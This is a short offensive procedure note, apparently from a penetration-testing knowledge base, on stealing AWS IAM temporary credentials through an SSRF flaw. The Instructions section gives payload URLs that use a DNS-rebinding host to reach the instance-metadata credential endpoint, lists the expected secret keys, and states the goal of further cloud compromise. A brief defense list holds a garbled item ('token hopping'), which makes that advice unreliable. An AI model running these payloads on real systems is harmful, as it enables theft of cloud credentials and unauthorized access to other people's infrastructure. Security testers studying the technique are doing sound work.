---
tags:
  - aws
  - iam
  - credential-theft
type: procedure
tools: []
tactics:
  - '[[Credential Access]]'
commands: []
verified: false
platforms:
  - AWS
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Steal Application Access Token]]'
updated_at: '2025-12-14T04:39:09.893Z'
skill_level: advanced
impact_level: critical
detection_risk: high
sub_techniques: []
id: 1d82312b-c92f-4a9e-96fa-a9abb1e97c50
validated: true
mitre_tactics:
  - '[[Credential Access]]'
mitre_techniques:
  - '[[Steal Application Access Token]]'
---
# Retrieve IAM Credentials via Bypassed SSRF

## Summary

Extract AWS IAM role details and temporary credentials using the SSRF bypass to access specific metadata endpoints.

## Description

Once SSRF is active, target `/latest/meta-data/iam/security-credentials/role-name` to retrieve access keys. This grants temporary AWS permissions, enabling enumeration of S3 buckets, EC2 instances, or further privilege escalation in the cloud environment.

## Requirements

1. Successful SSRF bypass
2. Knowledge of IAM role name (or enumerate first)
3. AWS CLI or SDK for validation

## Defense

Defensive measures and detection strategies:

- Remove unnecessary IAM roles from EC2
- Enable IMDSv2 with token hopping
- Monitor CloudTrail for anomalous API calls

## Objectives

1. Steal temporary AWS credentials
2. Enable cloud resource access
3. Assess further compromise potential

## Instructions

### Step 1: Target IAM Endpoint

**Context**: Use rebinding for credential path.

Submit `http://rebind.1u.ms/latest/meta-data/iam/security-credentials/`.

> Expected: Role name listed.

### Step 2: Fetch Specific Credentials

**Context**: Get keys for the role.

Follow up with `http://rebind.1u.ms/latest/meta-data/iam/security-credentials/role-name`.

> Expected: JSON with AccessKeyId, SecretAccessKey, Token.

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access]]

### Techniques

- [[Steal Application Access Token]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[aws]]
- [[iam]]
